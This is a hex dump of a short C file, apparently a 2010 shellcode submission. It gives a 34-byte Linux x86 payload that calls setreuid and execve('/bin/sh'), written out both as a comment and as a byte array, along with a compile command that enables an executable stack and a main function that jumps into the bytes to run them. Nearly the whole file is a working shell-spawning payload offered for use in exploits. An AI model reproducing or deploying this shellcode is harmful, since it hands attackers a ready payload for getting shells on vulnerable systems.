00000000  23 69 6e 63 6c 75 64 65  20 3c 73 74 64 69 6f 2e  |#include <stdio.|
00000010  68 3e 0d 0a 23 69 6e 63  6c 75 64 65 20 3c 73 74  |h>..#include <st|
00000020  72 69 6e 67 2e 68 3e 0d  0a 20 0d 0a 2f 2a 0d 0a  |ring.h>.. ../*..|
00000030  20 20 20 20 62 79 20 4d  61 67 6e 65 66 69 6b 6b  |    by Magnefikk|
00000040  6f 0d 0a 20 20 20 20 31  34 2e 30 34 2e 32 30 31  |o..    14.04.201|
00000050  30 0d 0a 20 20 20 20 6d  61 67 6e 65 66 69 6b 6b  |0..    magnefikk|
00000060  6f 40 67 6d 61 69 6c 2e  63 6f 6d 0d 0a 20 20 20  |o@gmail.com..   |
00000070  20 70 72 6f 6d 68 79 6c  2e 6f 7a 2e 70 6c 0d 0a  | promhyl.oz.pl..|
00000080  20 20 20 20 53 75 62 67  72 6f 75 70 3a 20 23 50  |    Subgroup: #P|
00000090  52 65 6b 61 6d 62 72 0d  0a 20 20 20 20 4e 61 6d  |Rekambr..    Nam|
000000a0  65 3a 20 33 34 20 62 79  74 65 73 20 73 65 74 72  |e: 34 bytes setr|
000000b0  65 75 64 28 67 65 74 75  69 64 28 29 2c 20 67 65  |eud(getuid(), ge|
000000c0  74 75 69 64 28 29 29 20  26 20 65 78 65 63 76 65  |tuid()) & execve|
000000d0  28 22 2f 62 69 6e 2f 73  68 22 29 20 73 68 65 6c  |("/bin/sh") shel|
000000e0  6c 63 6f 64 65 0d 0a 20  20 20 20 50 6c 61 74 66  |lcode..    Platf|
000000f0  6f 72 6d 3a 20 4c 69 6e  75 78 20 78 38 36 0d 0a  |orm: Linux x86..|
00000100  20 20 20 20 20 0d 0a 20  20 20 20 73 65 74 72 65  |     ..    setre|
00000110  75 69 64 28 67 65 74 75  69 64 28 29 2c 20 67 65  |uid(getuid(), ge|
00000120  74 75 69 64 28 29 29 3b  0d 0a 20 20 20 20 65 78  |tuid());..    ex|
00000130  65 63 76 65 28 22 2f 62  69 6e 2f 73 68 22 29 3b  |ecve("/bin/sh");|
00000140  20 0d 0a 20 0d 0a 20 20  20 20 67 63 63 20 2d 57  | .. ..    gcc -W|
00000150  6c 2c 2d 7a 2c 65 78 65  63 73 74 61 63 6b 20 66  |l,-z,execstack f|
00000160  69 6c 65 6e 61 6d 65 2e  63 0d 0a 20 0d 0a 20 20  |ilename.c.. ..  |
00000170  20 20 73 68 65 6c 6c 63  6f 64 65 3a 0d 0a 20 0d  |  shellcode:.. .|
00000180  0a 5c 78 36 61 5c 78 31  38 5c 78 35 38 5c 78 63  |.\x6a\x18\x58\xc|
00000190  64 5c 78 38 30 5c 78 35  30 5c 78 35 30 5c 78 35  |d\x80\x50\x50\x5|
000001a0  62 5c 78 35 39 5c 78 36  61 5c 78 34 36 5c 78 35  |b\x59\x6a\x46\x5|
000001b0  38 5c 78 63 64 5c 78 38  30 5c 78 35 30 5c 78 36  |8\xcd\x80\x50\x6|
000001c0  38 5c 78 32 66 5c 78 32  66 5c 78 37 33 5c 78 36  |8\x2f\x2f\x73\x6|
000001d0  38 5c 78 36 38 5c 78 32  66 5c 78 36 32 5c 78 36  |8\x68\x2f\x62\x6|
000001e0  39 5c 78 36 65 5c 78 38  39 5c 78 65 33 5c 78 39  |9\x6e\x89\xe3\x9|
000001f0  39 5c 78 33 31 5c 78 63  39 5c 78 62 30 5c 78 30  |9\x31\xc9\xb0\x0|
00000200  62 5c 78 63 64 5c 78 38  30 0d 0a 20 0d 0a 2a 2f  |b\xcd\x80.. ..*/|
00000210  0d 0a 20 0d 0a 20 0d 0a  69 6e 74 20 6d 61 69 6e  |.. .. ..int main|
00000220  28 29 7b 0d 0a 20 20 20  20 63 68 61 72 20 73 68  |(){..    char sh|
00000230  65 6c 6c 5b 5d 20 3d 0d  0a 22 5c 78 36 61 5c 78  |ell[] =.."\x6a\x|
00000240  31 38 5c 78 35 38 5c 78  63 64 5c 78 38 30 5c 78  |18\x58\xcd\x80\x|
00000250  35 30 5c 78 35 30 5c 78  35 62 5c 78 35 39 5c 78  |50\x50\x5b\x59\x|
00000260  36 61 5c 78 34 36 5c 78  35 38 5c 78 63 64 5c 78  |6a\x46\x58\xcd\x|
00000270  38 30 5c 78 35 30 5c 78  36 38 5c 78 32 66 5c 78  |80\x50\x68\x2f\x|
00000280  32 66 5c 78 37 33 5c 78  36 38 5c 78 36 38 5c 78  |2f\x73\x68\x68\x|
00000290  32 66 5c 78 36 32 5c 78  36 39 5c 78 36 65 5c 78  |2f\x62\x69\x6e\x|
000002a0  38 39 5c 78 65 33 5c 78  39 39 5c 78 33 31 5c 78  |89\xe3\x99\x31\x|
000002b0  63 39 5c 78 62 30 5c 78  30 62 5c 78 63 64 5c 78  |c9\xb0\x0b\xcd\x|
000002c0  38 30 22 3b 0d 0a 20 20  20 20 70 72 69 6e 74 66  |80";..    printf|
000002d0  28 22 62 79 20 4d 61 67  6e 65 66 69 6b 6b 6f 5c  |("by Magnefikko\|
000002e0  6e 6d 61 67 6e 65 66 69  6b 6b 6f 40 67 6d 61 69  |nmagnefikko@gmai|
000002f0  6c 2e 63 6f 6d 5c 6e 70  72 6f 6d 68 79 6c 2e 6f  |l.com\npromhyl.o|
00000300  7a 2e 70 6c 5c 6e 5c 6e  73 74 72 6c 65 6e 28 73  |z.pl\n\nstrlen(s|
00000310  68 65 6c 6c 29 0d 0a 3d  20 25 64 5c 6e 22 2c 20  |hell)..= %d\n", |
00000320  73 74 72 6c 65 6e 28 73  68 65 6c 6c 29 29 3b 0d  |strlen(shell));.|
00000330  0a 20 20 20 20 28 2a 28  76 6f 69 64 20 28 2a 29  |.    (*(void (*)|
00000340  28 29 29 20 73 68 65 6c  6c 29 28 29 3b 0d 0a 7d  |()) shell)();..}|
00000350
